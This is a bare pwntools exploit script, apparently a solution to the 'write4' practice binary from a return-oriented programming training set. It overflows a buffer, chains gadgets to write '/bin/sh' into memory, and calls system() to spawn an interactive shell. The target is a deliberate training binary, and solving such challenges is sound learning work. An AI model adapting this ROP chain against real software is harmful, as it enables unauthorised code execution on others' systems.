from pwn import *
from struct import pack

pop2ret = 0x400890
mov = 0x400820
bin_sh_addr = 0x601050
bin_sh_str = 0x2f62696e2f736800
system_call = 0x4005e0
poprdi = 0x400893
ret = 0x4007b4

p = process('./write4')

exploit = ''
exploit += 'A'*40
exploit += p64(pop2ret)
exploit += p64(bin_sh_addr)
exploit += pack(">Q", bin_sh_str)
exploit += p64(mov)

exploit += p64(poprdi)
exploit += p64(bin_sh_addr)
exploit += p64(ret)
exploit += p64(system_call)

p.recvuntil('>')
p.sendline(exploit)
p.interactive()
